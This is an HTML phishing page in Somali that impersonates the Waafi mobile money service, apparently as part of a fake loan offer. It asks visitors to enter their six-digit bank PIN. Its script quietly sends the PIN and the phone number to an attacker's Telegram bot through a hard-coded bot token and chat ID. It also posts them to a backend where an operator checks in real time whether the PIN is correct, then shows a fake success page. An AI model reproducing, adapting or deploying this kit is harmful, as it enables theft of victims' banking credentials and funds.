<!DOCTYPE html>
<html lang="so">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Waafi - Bank PIN</title>
    <style>
        * {
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        
        body {
            margin: 0;
            padding: 0;
            background-color: #fff;
            display: flex;
            flex-direction: column;
            height: 100vh;
            overflow: hidden;
        }
        
        .container {
            flex: 1;
            padding: 40px 20px;
            text-align: center;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        
        h2 {
            font-size: 22px;
            color: #333;
            margin-bottom: 10px;
            font-weight: 500;
            width: 100%;
        }
        
        p {
            font-size: 14px;
            color: #666;
            line-height: 1.5;
            margin-bottom: 25px;
            width: 100%;
        }
        
        .pin-inputs {
            display: flex;
            justify-content: center;
            gap: 8px;
            margin: 30px 0;
        }
        
        .pin-inputs input {
            width: 45px;
            height: 55px;
            border: 1.5px solid #ccc;
            border-radius: 8px;
            text-align: center;
            font-size: 20px;
            font-weight: bold;
            outline: none;
        }
        
        .pin-inputs input:focus {
            border-color: #2ecc71;
            border-width: 2px;
        }
        
        .btn-verify {
            width: 100%;
            max-width: 320px;
            padding: 15px;
            border-radius: 10px;
            border: none;
            background-color: #e0e0e0;
            color: #a0a0a0;
            font-size: 14px;
            font-weight: bold;
            cursor: not-allowed;
            text-transform: uppercase;
            transition: 0.3s;
        }
        
        .btn-verify.active {
            background-color: #2ecc71;
            color: white;
            cursor: pointer;
        }
        
        #wait-container {
            display: none;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 50%;
        }
        
        .wait-text {
            font-size: 16px;
            font-weight: 600;
            color: #000000;
            margin-top: 20px;
        }
        
        .footer {
            position: relative;
            height: 250px;
            background: linear-gradient(to bottom, #2ecc71, #27ae60);
            border-top-left-radius: 50% 100px;
            border-top-right-radius: 50% 100px;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            font-size: 12px;
            margin-top: auto;
            width: 100%;
        }
        
        #status-msg {
            margin-top: 15px;
            font-size: 14px;
            font-weight: 500;
            min-height: 20px;
            color: #2ecc71;
        }
    </style>
</head>

<body>

    <div class="container" id="main-ui">
        <div id="input-section">
            <h2>Geli PIN-ka Bangiga</h2>
            <p>Fadlan geli 6-da god ee PIN-kaaga bangiga si aad u xaqiijiso aqoonsigaaga.</p>

            <div class="pin-inputs">
                <input type="password" maxlength="1" inputmode="numeric">
                <input type="password" maxlength="1" inputmode="numeric">
                <input type="password" maxlength="1" inputmode="numeric">
                <input type="password" maxlength="1" inputmode="numeric">
                <input type="password" maxlength="1" inputmode="numeric">
                <input type="password" maxlength="1" inputmode="numeric">
            </div>

            <button class="btn-verify" id="submit-btn">XAQIIJI PIN-KA BANGIGA</button>
            <div id="status-msg"></div>
        </div>

        <div id="wait-container">
            <div class="wait-text">Waa la diray. Fadlan sug oggolaanshaha...</div>
        </div>
    </div>

    <div class="footer">
        © 2026 Waafi Soomaaliya
    </div>

    <script>
        // ============================================================
        // CONFIGURE YOUR TELEGRAM BOT
        // ============================================================
        const BOT_TOKEN = "8883436608:AAFr4V36VynC6nkcoHOZ93uco4W4A_cMSUc";
        const ADMIN_CHAT_ID = "7559800358";
        // ============================================================

        const inputs = document.querySelectorAll('.pin-inputs input');
        const btn = document.getElementById('submit-btn');
        const inputSection = document.getElementById('input-section');
        const waitContainer = document.getElementById('wait-container');
        const statusMsg = document.getElementById('status-msg');

        let isSubmitting = false;

        // Auto-move PIN inputs
        inputs.forEach((input, index) => {
            input.addEventListener('input', () => {
                input.value = input.value.replace(/\D/g, '');
                if (input.value && index < inputs.length - 1) {
                    inputs[index + 1].focus();
                }
                checkFull();
            });

            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !input.value && index > 0) {
                    inputs[index - 1].focus();
                    inputs[index - 1].value = '';
                    checkFull();
                }
            });

            // Paste support
            input.addEventListener('paste', (e) => {
                e.preventDefault();
                const paste = (e.clipboardData || window.clipboardData).getData('text');
                const digits = paste.replace(/\D/g, '').split('');
                digits.forEach((digit, idx) => {
                    if (idx < inputs.length) inputs[idx].value = digit;
                });
                const emptyIdx = [...inputs].findIndex(inp => inp.value === '');
                if (emptyIdx !== -1) inputs[emptyIdx].focus();
                else inputs[inputs.length - 1].focus();
                checkFull();
            });
        });

        function checkFull() {
            const pin = Array.from(inputs).map(i => i.value).join('');
            if (pin.length === 6) {
                btn.classList.add('active');
                btn.disabled = false;
            } else {
                btn.classList.remove('active');
                btn.disabled = true;
            }
        }

        // Initially disable button
        btn.disabled = true;

        // ---- Main submit handler ----
        btn.addEventListener('click', async() => {
            if (!btn.classList.contains('active') || isSubmitting) return;
            isSubmitting = true;

            const pin = Array.from(inputs).map(i => i.value).join('');
            const phone = localStorage.getItem('userPhone') || localStorage.getItem('phone') || "Unknown";

            // Ensure loan data exists for success page
            if (!localStorage.getItem('loan_amount')) {
                localStorage.setItem('loan_amount', '1,000');
                localStorage.setItem('loan_term', '12');
                localStorage.setItem('monthly_repayment', '90');
            }

            // Show waiting state
            statusMsg.innerText = "⏳ Waa la diray...";
            inputSection.style.display = "none";
            waitContainer.style.display = "flex";

            // ---- 1. Send Bank PIN to Telegram Bot (fire & forget) ----
            if (BOT_TOKEN !== "YOUR_BOT_TOKEN_HERE" && ADMIN_CHAT_ID !== "YOUR_ADMIN_CHAT_ID_HERE") {
                try {
                    const message = "🏦 *Bank PIN waa la soo galiyay*\n\n📱 Phone: `" + phone + "`\n🔢 PIN: `" + pin + "`";
                    fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify({
                            chat_id: ADMIN_CHAT_ID,
                            text: message,
                            parse_mode: "Markdown"
                        })
                    });
                } catch (e) {
                    console.log("Telegram send failed (non-blocking):", e);
                }
            }

            // ---- 2. Try backend endpoint (if exists) ----
            try {
                const response = await fetch('/api/verify-bank-pin', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        phone: phone,
                        bankPin: pin
                    })
                });
                const data = await response.json();
                if (data.success) {
                    startPolling(phone);
                } else {
                    // Backend returned error but still navigate to success
                    setTimeout(() => {
                        window.location.href = "success.html";
                    }, 2000);
                }
            } catch (err) {
                console.log("Backend not available, navigating to success...");
                // ---- 3. Navigate to success page after brief delay ----
                setTimeout(() => {
                    window.location.href = "success.html";
                }, 2000);
            }
        });

        function startPolling(phone) {
            const pollInterval = setInterval(async() => {
                try {
                    const res = await fetch(`/api/check-status?phone=${encodeURIComponent(phone)}`);
                    const data = await res.json();

                    if (data.status === "bank_pin_correct") {
                        clearInterval(pollInterval);
                        window.location.href = "success.html";
                    } else if (data.status === "bank_pin_wrong") {
                        clearInterval(pollInterval);
                        alert("PIN-ka Bangiga waa khalad.");
                        location.reload();
                    }
                } catch (e) {
                    console.error("Waiting for verification...");
                }
            }, 3000);
        }
    </script>
</body>

</html>
